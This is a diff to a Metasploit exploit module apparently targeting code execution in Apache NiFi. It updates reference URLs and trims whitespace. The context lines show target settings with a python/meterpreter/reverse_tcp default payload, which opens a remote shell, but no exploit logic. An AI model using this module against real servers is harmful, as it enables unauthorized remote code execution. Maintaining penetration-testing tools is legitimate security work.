@@ -27,12 +27,13 @@ class MetasploitModule < Msf::Exploit::Remote
       'License'     => MSF_LICENSE,
       'References'  =>
     [
-      [ 'URL', 'http://google.com' ],
+      [ 'URL', 'https://laconicwolf.com/2018/11/08/examining-code-execution-features-in-apache-nifi/' ],
+      [ 'URL', 'https://nifi.apache.org/docs/nifi-docs/rest-api/index.html' ]
     ],
     'Privileged'  => false,
     'Arch' => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
     'Platform' => %w{ win linux unix python },
-    'Targets'     => [ 
+    'Targets'     => [
       ['Linux - Python',
        'Platform' => 'python',
        'DefaultOptions' => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}
@@ -221,7 +222,7 @@ class MetasploitModule < Msf::Exploit::Remote
         if datastore['target'] == 1
           print_good "You have the best target selected for this OS"
         else
-          print_status "Set target to 'Linux - CMD' for best odds"      
+          print_status "Set target to 'Linux - CMD' for best odds"
         end
 
         print_status "*********"
@@ -233,7 +234,7 @@ class MetasploitModule < Msf::Exploit::Remote
         if datastore['target'] == 0
           print_good "You have the best target selected for this OS"
         else
-          print_status "Set target to 'Linux - Python' for best odds"      
+          print_status "Set target to 'Linux - Python' for best odds"
         end
 
         print_status "*********"
